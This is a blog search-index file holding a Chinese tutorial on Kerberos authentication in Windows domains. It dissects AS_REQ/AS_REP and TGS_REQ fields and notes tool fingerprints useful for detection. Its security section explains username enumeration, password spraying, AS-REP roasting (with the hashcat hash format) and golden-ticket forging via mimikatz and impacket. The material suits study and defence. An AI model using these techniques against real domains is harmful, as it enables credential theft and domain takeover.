<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>windows认证机制</title>
    <url>/windows/Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>闲着也是闲着，所以整理一篇，让自己的知识形成体系，部分地方加锚点，让知识之间串联起来，防止看完觉得乱乱的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown96074895_p9.jpg"></p>
<span id="more"></span>

<p>特此声明，文中部分描述来自wiki。</p>
<h1 id="Kerberos-篇"><a href="#Kerberos-篇" class="headerlink" title="Kerberos 篇"></a>Kerberos 篇</h1><h2 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>体量太大，所以每一个大章一个前言。</p>
<p>熟悉内网渗透的应该都对IPC，黄金票据，白银票据，ntlm relay，Ptt,Ptk 这些词汇再熟悉不够了，对其利用工具也了如指掌，但是有些人对里面使用的原理还不太了解，知其然不知其所以然，本系列文章将针对内网渗透的常见协议(如kerbeos,ntlm,smb,ldap等)进行协议分析，相关漏洞分析以及漏洞工具分析利用。</p>
<p>kerberos 篇将从四个方面来阐述kerberos协议，分别是kerberos的两个基础认证模块AS_REQ &amp; AS_REP,TGS_REQ &amp; TGS_REP。以及微软扩展的两个认证模块S4U和PAC。这个章节是 kerberos 篇的第一块 <code>AS_REQ</code> &amp; <code>AS_REP</code> 。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01176eab7c7a39d1d9.png"></p>
<h3 id="kerberos-协议概述"><a href="#kerberos-协议概述" class="headerlink" title="kerberos 协议概述"></a>kerberos 协议概述</h3><p>Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端 &#x2F; 服务器应用程序提供强身份验证。</p>
<p>在Kerberos协议中主要是有三个角色的存在：</p>
<ol>
<li>访问服务的<code>Client</code>(以下表述为Client 或者用户)</li>
<li>提供服务的<code>Server</code>(以下表述为服务)</li>
<li><code>KDC</code>（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li>
</ol>
<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
<p>kerberos的简化认证认证过程如下图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownkerberos_environment.webp"></p>
<ol>
<li><code>AS_REQ</code>: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</li>
<li><code>AS_REP</code>: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</li>
<li><code>TGS_REQ</code>: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</li>
<li><code>TGS_REP</code>: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</li>
<li><code>AP_REQ</code>: Client拿着TGS票据去请求服务</li>
<li><code>AP_REP</code>: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</li>
</ol>
<h3 id="kerberos-测试工具"><a href="#kerberos-测试工具" class="headerlink" title="kerberos 测试工具"></a>kerberos 测试工具</h3><p>在学习 kerberos 协议的过程中，一直以来都是利用工具发包，然后再通过 wireshark 抓包分析，这让用惯了Burp的我很不习惯，burp的repeater模块可以很方便的改包，发包，查看响应包。为了更方便得学习kerberos，简单得写了个测试工具，用于 kerbreos 协议的研究，实验环境为虚拟机内的win7系统中。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015f25c3d61e10068e.png"></p>
<p>点击修改配置，支持明文密码以及hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ee3217094e548c8c.png"></p>
<p>协议的各个字段将在本章节以及接下来的几个章节里面详细阐述，配合此工具理解kerberos 字段，效果更佳。</p>
<h3 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h3><p>用户向KDC发起AS_REQ,请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。详情见以下每个字段的详细介绍。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010aad636f2c02d394.png"></p>
<h4 id="pvno"><a href="#pvno" class="headerlink" title="pvno"></a>pvno</h4><p>kerberos 版本号</p>
<h4 id="msg-type"><a href="#msg-type" class="headerlink" title="msg-type"></a>msg-type</h4><p>类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)</p>
<h4 id="PA-DATA"><a href="#PA-DATA" class="headerlink" title="PA_DATA"></a>PA_DATA</h4><p>主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有type和value。</p>
<p>type主要有以下一些：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">            NONE = <span class="number">0</span>,</span><br><span class="line">​            TGS_REQ = <span class="number">1</span>,</span><br><span class="line">​            AP_REQ = <span class="number">1</span>,</span><br><span class="line">​            ENC_TIMESTAMP = <span class="number">2</span>,</span><br><span class="line">​            PW_SALT = <span class="number">3</span>,</span><br><span class="line">​            ENC_UNIX_TIME = <span class="number">5</span>,</span><br><span class="line">​            SANDIA_SECUREID = <span class="number">6</span>,</span><br><span class="line">​            SESAME = <span class="number">7</span>,</span><br><span class="line">​            OSF_DCE = <span class="number">8</span>,</span><br><span class="line">​            CYBERSAFE_SECUREID = <span class="number">9</span>,</span><br><span class="line">​            AFS3_SALT = <span class="number">10</span>,</span><br><span class="line">​            ETYPE_INFO = <span class="number">11</span>,</span><br><span class="line">​            SAM_CHALLENGE = <span class="number">12</span>,</span><br><span class="line">​            SAM_RESPONSE = <span class="number">13</span>,</span><br><span class="line">​            PK_AS_REQ_19 = <span class="number">14</span>,</span><br><span class="line">​            PK_AS_REP_19 = <span class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ_WIN = <span class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ = <span class="number">16</span>,</span><br><span class="line">​            PK_AS_REP = <span class="number">17</span>,</span><br><span class="line">​            PA_PK_OCSP_RESPONSE = <span class="number">18</span>,</span><br><span class="line">​            ETYPE_INFO2 = <span class="number">19</span>,</span><br><span class="line">​            USE_SPECIFIED_KVNO = <span class="number">20</span>,</span><br><span class="line">​            SVR_REFERRAL_INFO = <span class="number">20</span>,</span><br><span class="line">​            SAM_REDIRECT = <span class="number">21</span>,</span><br><span class="line">​            GET_FROM_TYPED_DATA = <span class="number">22</span>,</span><br><span class="line">​            SAM_ETYPE_INFO = <span class="number">23</span>,</span><br><span class="line">​            SERVER_REFERRAL = <span class="number">25</span>,</span><br><span class="line">​            TD_KRB_PRINCIPAL = <span class="number">102</span>,</span><br><span class="line">​            PK_TD_TRUSTED_CERTIFIERS = <span class="number">104</span>,</span><br><span class="line">​            PK_TD_CERTIFICATE_INDEX = <span class="number">105</span>,</span><br><span class="line">​            TD_APP_DEFINED_ERROR = <span class="number">106</span>,</span><br><span class="line">​            TD_REQ_NONCE = <span class="number">107</span>,</span><br><span class="line">​            TD_REQ_SEQ = <span class="number">108</span>,</span><br><span class="line">​            PA_PAC_REQUEST = <span class="number">128</span>,</span><br><span class="line">​            S4U2SELF = <span class="number">129</span>,</span><br><span class="line">​            PA_PAC_OPTIONS = <span class="number">167</span>,</span><br><span class="line">​            PK_AS_09_BINDING = <span class="number">132</span>,</span><br><span class="line">​            CLIENT_CANONICALIZED = <span class="number">133</span></span><br></pre></td></tr></table></figure>

<p>在AS_REQ阶段主要用到的有两个</p>
<ol>
<li><p><code>ENC_TIMESTAMP</code><br>这个是预认证，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过</p>
</li>
<li><p><code>PA_PAC_REQUEST</code><br>这个是启用PAC支持的扩展。PAC（Privilege Attribute Certificate）并不在原生的 kerberos 里面，是微软引进的扩展。详细的内容之后会详细介绍PAC。PAC包含在AS_REQ的响应 body(AS_REP) 。这里的 value 对应的是 include&#x3D;true 或者 include&#x3D;false (KDC根据include的值来判断返回的票据中是否携带PAC)。</p>
</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019ac8c55225707d89.png"></p>
<h4 id="REQ-BODY"><a href="#REQ-BODY" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h4><p>kdc-options 一些flag 字段</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">            VALIDATE = <span class="number">0x00000001</span>,</span><br><span class="line">​              RENEW = <span class="number">0x00000002</span>,</span><br><span class="line">​              UNUSED29 = <span class="number">0x00000004</span>,</span><br><span class="line">​              ENCTKTINSKEY = <span class="number">0x00000008</span>,</span><br><span class="line">​              RENEWABLEOK = <span class="number">0x00000010</span>,</span><br><span class="line">​              DISABLETRANSITEDCHECK = <span class="number">0x00000020</span>,</span><br><span class="line">​              UNUSED16 = <span class="number">0x0000FFC0</span>,</span><br><span class="line">​              CANONICALIZE = <span class="number">0x00010000</span>,</span><br><span class="line">​              CNAMEINADDLTKT = <span class="number">0x00020000</span>,</span><br><span class="line">​              OK_AS_DELEGATE = <span class="number">0x00040000</span>,</span><br><span class="line">​              UNUSED12 = <span class="number">0x00080000</span>,</span><br><span class="line">​              OPTHARDWAREAUTH = <span class="number">0x00100000</span>,</span><br><span class="line">​              PREAUTHENT = <span class="number">0x00200000</span>,</span><br><span class="line">​              INITIAL = <span class="number">0x00400000</span>,</span><br><span class="line">​              RENEWABLE = <span class="number">0x00800000</span>,</span><br><span class="line">​              UNUSED7 = <span class="number">0x01000000</span>,</span><br><span class="line">​              POSTDATED = <span class="number">0x02000000</span>,</span><br><span class="line">​              ALLOWPOSTDATE = <span class="number">0x04000000</span>,</span><br><span class="line">​              PROXY = <span class="number">0x08000000</span>,</span><br><span class="line">​              PROXIABLE = <span class="number">0x10000000</span>,</span><br><span class="line">​              FORWARDED = <span class="number">0x20000000</span>,</span><br><span class="line">​              FORWARDABLE = <span class="number">0x40000000</span>,</span><br><span class="line">​              RESERVED = <span class="number">0x80000000</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>cname<br>PrincipalName 类型。PrincipalName包含type和value。</p>
<ul>
<li>KRB_NT_PRINCIPAL &#x3D; 1 means just the name of the principal 如dailker</li>
<li>KRB_NT_SRV_INST &#x3D; 2 service and other unique instance (krbtgt) 如krbtgt，cifs</li>
<li>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:&#x75;&#115;&#x65;&#114;&#x40;&#100;&#111;&#109;&#97;&#105;&#x6e;&#46;&#99;&#111;&#x6d;">&#x75;&#115;&#x65;&#114;&#x40;&#100;&#111;&#109;&#97;&#105;&#x6e;&#46;&#99;&#111;&#x6d;</a><br>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href='#p1'>相关的安全问题&gt;用户名枚举</a></li>
</ul>
</li>
<li><p>sname<br>PrincipalName 类型<br>在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</p>
</li>
<li><p>realm<br>域名</p>
</li>
<li><p>from<br>发送时间</p>
</li>
<li><p>till<br>到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具。</p>
</li>
<li><p>nonce<br>随机生成的一个数kekeo&#x2F;mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为特征检测工具。</p>
</li>
<li><p>etype<br>加密类型，有</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">             des_cbc_crc = <span class="number">1</span>,</span><br><span class="line">​             des_cbc_md4 = <span class="number">2</span>,</span><br><span class="line">​             des_cbc_md5 = <span class="number">3</span>,</span><br><span class="line">​             des3_cbc_md5 = <span class="number">5</span>,</span><br><span class="line">​             des3_cbc_sha1 = <span class="number">7</span>,</span><br><span class="line">​             dsaWithSHA1_CmsOID = <span class="number">9</span>,</span><br><span class="line">​             md5WithRSAEncryption_CmsOID = <span class="number">10</span>,</span><br><span class="line">​             sha1WithRSAEncryption_CmsOID = <span class="number">11</span>,</span><br><span class="line">​             rc2CBC_EnvOID = <span class="number">12</span>,</span><br><span class="line">​             rsaEncryption_EnvOID = <span class="number">13</span>,</span><br><span class="line">​             rsaES_OAEP_ENV_OID = <span class="number">14</span>,</span><br><span class="line">​             des_ede3_cbc_Env_OID = <span class="number">15</span>,</span><br><span class="line">​             des3_cbc_sha1_kd = <span class="number">16</span>,</span><br><span class="line">​             aes128_cts_hmac_sha1 = <span class="number">17</span>,</span><br><span class="line">​             aes256_cts_hmac_sha1 = <span class="number">18</span>,</span><br><span class="line">​             rc4_hmac = <span class="number">23</span>,</span><br><span class="line">​             rc4_hmac_exp = <span class="number">24</span>,</span><br><span class="line">​             subkey_keymaterial = <span class="number">65</span></span><br></pre></td></tr></table></figure>

<p>这个地方要注意的是如果在配置里面选择用hash(不是plaintext)的话，hash的加密类型，要跟etype一样。因为KDC是按照etype类型选择用户对应加密方式的hash，如果是选择明文(plaintext)，那么client 会按照etype里面的加密方式将明文加密成hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01161830d0444fbe4c.png"></p>
<h3 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h3><p>KDC使用用户 hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015d346eac5679f85c.png"></p>
<p>KDC使用用户 hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</p>
<h4 id="msg-type-1"><a href="#msg-type-1" class="headerlink" title="msg-type"></a>msg-type</h4><p>AS_REQ的响应body对应的就是KRB_AS_REP(0x0b)</p>
<h4 id="crealm"><a href="#crealm" class="headerlink" title="crealm"></a>crealm</h4><p>域名</p>
<h4 id="cname"><a href="#cname" class="headerlink" title="cname"></a>cname</h4><p>用户名</p>
<h4 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h4><p>这个ticket用于TGS_REQ的认证。是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。详情见<a href='#p2'>相关的安全问题&gt;黄金票据</a>。</p>
<h4 id="enc-part"><a href="#enc-part" class="headerlink" title="enc_part"></a>enc_part</h4><p>这部分是可以解密的，key是用户hash，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是session key，作为下阶段的认证密钥。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016a35794986fb33b0.png"></p>
<h3 id="导出的票据"><a href="#导出的票据" class="headerlink" title="导出的票据"></a>导出的票据</h3><p>凭据里面最核心的东西是 session-key 和加密的 ticket 。</p>
<p>正常我们用工具生成的凭据是.ccache和.kirbi后缀的，用 mimikatz，kekeo，rubeus 生成的凭据是以.kirbi后缀的。impacket 生成的凭据的后缀是.ccache。两种票据主要包含的都是 session-key 和加密的 ticket ，因此可以相互转化。</p>
<p>以kirbi为例介绍下该结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> KRB-CRED::= [APPLICATION <span class="number">22</span>] SEQUENCE &#123;</span><br><span class="line">   pvno[<span class="number">0</span>] INTEGER(<span class="number">5</span>),</span><br><span class="line">   msg-type[<span class="number">1</span>] INTEGER(<span class="number">22</span>),</span><br><span class="line">   tickets[<span class="number">2</span>] SEQUENCE OF Ticket,</span><br><span class="line">   enc-part[<span class="number">3</span>] EncryptedData -- EncKrbCredPart</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中ticket来自于KRB_AS_REP部分的ticket</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EncKrbCredPart  ::= [APPLICATION <span class="number">29</span>] SEQUENCE &#123;</span><br><span class="line">   ticket-info     [<span class="number">0</span>] SEQUENCE OF KrbCredInfo,  <span class="comment">//这里就只用到这个</span></span><br><span class="line">   nonce           [<span class="number">1</span>] UInt32 OPTIONAL,</span><br><span class="line">   timestamp       [<span class="number">2</span>] KerberosTime OPTIONAL,</span><br><span class="line">   usec            [<span class="number">3</span>] Microseconds OPTIONAL,</span><br><span class="line">   s-address       [<span class="number">4</span>] HostAddress OPTIONAL,</span><br><span class="line">   r-address       [<span class="number">5</span>] HostAddress OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ticket-info部分的主要内容是session-key，来自于用户hash解密enc_part的部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KrbCredInfo     ::= SEQUENCE &#123;</span><br><span class="line">  key             [<span class="number">0</span>] EncryptionKey,      sessionKey</span><br><span class="line">  prealm          [<span class="number">1</span>] Realm OPTIONAL,  <span class="comment">//对应的是realm</span></span><br><span class="line">  pname           [<span class="number">2</span>] PrincipalName OPTIONAL, <span class="comment">// 对应的是cname</span></span><br><span class="line">  flags           [<span class="number">3</span>] TicketFlags OPTIONAL, </span><br><span class="line">  authtime        [<span class="number">4</span>] KerberosTime OPTIONAL, <span class="comment">//not require</span></span><br><span class="line">  starttime       [<span class="number">5</span>] KerberosTime OPTIONAL, <span class="comment">// </span></span><br><span class="line">  endtime         [<span class="number">6</span>] KerberosTime OPTIONAL,</span><br><span class="line">  renew-till      [<span class="number">7</span>] KerberosTime OPTIONAL,</span><br><span class="line">  srealm          [<span class="number">8</span>] Realm OPTIONAL, <span class="comment">//对应的是realm</span></span><br><span class="line">  sname           [<span class="number">9</span>] PrincipalName OPTIONAL, <span class="comment">// 对应的是sname</span></span><br><span class="line">  caddr           [<span class="number">10</span>] HostAddresses OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="相关的安全问题"><a href="#相关的安全问题" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h3><h4 id="pass-the-hash-和-pass-the-key"><a href="#pass-the-hash-和-pass-the-key" class="headerlink" title="pass the hash 和 pass the key"></a>pass the hash 和 pass the key</h4><p>在连接配置的时候允许使用hash进行认证，而不是只有账号密码才能认证。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01af29156e1e95022b.png"></p>
<p>就是由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key(使用sekurlsa::ekeys导出来)，就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p>
<h4 id='p1'>用户名枚举</h4>
看以下几种情况

<p>用户名存在，密码错误的情况下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014c57716ba42b44cd.png"></p>
<p>用户名不存在的情况下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c7363c4bf243acc6.png"></p>
<p>通过这个比较就可以写脚本改变 cname 的值进行用户名枚举。在域内没有域账号的情况下进行用户名枚举，在有账号的情况的下通过 LDAP 查询就行。如果有域内机器的 system 权限，那那台机器也是个域账户，账户名是机器名$.</p>
<h4 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h4><p>在已有用户名的时候，可以尝试爆破密码。<br>密码正确的情况下:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0110bca08bfd34bb90.png"></p>
<p>密码错误的情况下:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e34aa2625bcdaa3a.png"></p>
<p>这个时候就可以进行密码爆破了，但是在实践中，许多渗透测试人员和攻击者通常都会使用一种被称为“密码喷洒（Password Spraying）”的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
<h4 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h4><p>对于域用户，如果设置了选项 <code>Do not require Kerberos preauthentication</code>，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成<code>Kerberos 5 AS-REP etype 23</code>(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014ca76343bf5ba087.png"></p>
<p>我们没有用户hash，PA-DATA选择PA_PAC_REQUEST就行</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e43059e3547c0770.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01618262dcc542af40.png"></p>
<p>点击鼠标右键获取AS_REP里面enc-part部分里面的ciper，然后组装成前面32位16进制字符+$+后面的16进制字符得到repHash,然后<code>format(&quot;$krb5asrep$23$&#123;0&#125;@&#123;1&#125;:&#123;2&#125;&quot;, userName, domain, repHash)</code>得到字符串，交给hashcat 破解就行</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014bb1a809f8f463e8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0175eb56f168c260d3.png"></p>
<p>这里面只做漏洞原理演示。</p>
<h4 id='p2'>黄金票据</h4>

<p>在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的，如果我们拥有krbtgt的hash，就可以给我们自己签发任意用户的TGT票据，这个票据也被称为黄金票据。</p>
<h3 id="部分相关的工具"><a href="#部分相关的工具" class="headerlink" title="部分相关的工具"></a>部分相关的工具</h3><h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>Rubeus跟AS_REQ有关的功能主要有两个。</p>
<ul>
<li>asktgt</li>
</ul>
<p>这个功能用于发送tgt请求包，并将凭据以base64打印出来。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f304484b8f118bcf.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010c490cf19cc4d632.png"></p>
<p>可以通过powershell 解密base64并写入文件(注意回车换行)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b376d2fbbc9bcb60.png"></p>
<ul>
<li>As-repoasting</li>
</ul>
<p>这个功能会通过LDAP查询域内用户设置了选项”Do not require Kerberos preauthentication”，然后发AS_REQ的包，直接生成hash或者john可破解的格式</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01281791daf1a7a7b0.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d64b24a81966e52a.png"></p>
<h4 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h4><p>Impact 里面跟AS_REQ相关的脚本主要有两个。</p>
<ul>
<li>getTGT</li>
</ul>
<p>给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0179e377e91abeb5d3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f6d5b5f04caafa0f.png"></p>
<p>这里面需要注意的是用mimikatz，kekeo，rubeus生成的凭据是以<code>.kirbi</code>后缀的。impacket 生成的凭据的后缀是<code>.ccache</code>。</p>
<p>可以通过<a href="https://github.com/rvazarkar/KrbCredExport.git">工具</a>里面的脚本转化为kirbi</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019d7954d5dd545bb1.png"></p>
<ul>
<li>GetNPUsers</li>
</ul>
<p>此示例将尝试为那些设置了属性“不需要Kerberos预身份验证”（UF_DONT_REQUIRE_PREAUTH）的用户列出并获取TGT。输出与JtR兼容。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d8b0c1457d2a779d.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017d2483b993b81c82.png"></p>
<ul>
<li>ticketer</li>
</ul>
<p>该脚本将从零开始或基于模板（从KDC合法请求）创建Golden &#x2F; Silver票据，允许您自定义PAC_LOGON_INFO结构中设置的一些参数，特别是组，ExtraSids，持续时间等，票据格式是ccache.</p>
<p>首先获取krbtgt的hash:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01697b8e91c05bcddf.png"></p>
<p>获取域的sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b95246c0159fce6e.png"></p>
<p>制作黄金票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e3d6ff82445cf443.png"></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul>
<li>kerberos::golden</li>
</ul>
<p>mimikatz的kerberos::golden模块可以用于制作黄金票据,票据格式是.kirbi<br>首先获取krbtgt的hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0103e479df6f95c9ab.png"></p>
<p>获取域的sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017ed9b1c7d455c5d2.png"></p>
<p>制作黄金票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ae3c1d04ccc46dfc.png"></p>
<h4 id="nmap-NSE脚本"><a href="#nmap-NSE脚本" class="headerlink" title="nmap NSE脚本"></a>nmap NSE脚本</h4><p>krb5-enum-users<br>nmap 里面的这个脚本可以用来枚举域内用户</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0111d61a08ff02f41d.png"></p>
<h4 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h4><p>DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018884748fa98a8512.png"></p>
<h2 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>该章节是主讲TGS_REQ&amp; TGS_REP。在TGS_REQ &amp; TGS_REP阶段，用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限，KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。考虑到这两个扩展是TGS的子协议，把S4U归纳到这个章节里面一起讲。</p>
<p>TGS_REQ这个阶段不需要账号密码，需要AS_REP获取到的TGT凭据。这里面工具需要指定域控的地址。连接配置里面的其他信息都在凭据里面，这里可以不用指定。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ecc0dcdbc1334e4a.png"></p>
<h3 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h3><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013a3af94337ac907b.png"></p>
<p>这里面标注的字段是跟AS_REQ里面不一样的，在AS_REQ文档有标注，一样的内容就不再标注了。</p>
<h4 id="msg-type-2"><a href="#msg-type-2" class="headerlink" title="msg-type"></a>msg-type</h4><p>类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)</p>
<h4 id="PA-DATA-1"><a href="#PA-DATA-1" class="headerlink" title="PA-DATA"></a>PA-DATA</h4><p>正常的TGS_REQ的请求需要用到有</p>
<ul>
<li>AP_REQ</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01aafe4f5fb6d5a487.png"></p>
<p>这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据，就放在这个结构体里面。</p>
<p>KDC校验TGT票据，如果票据正确，就返回TGS票据。</p>
<ul>
<li>PA_FOR_USER</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0172367c2cad98b35e.png"></p>
<p>类型是S4U2SELF</p>
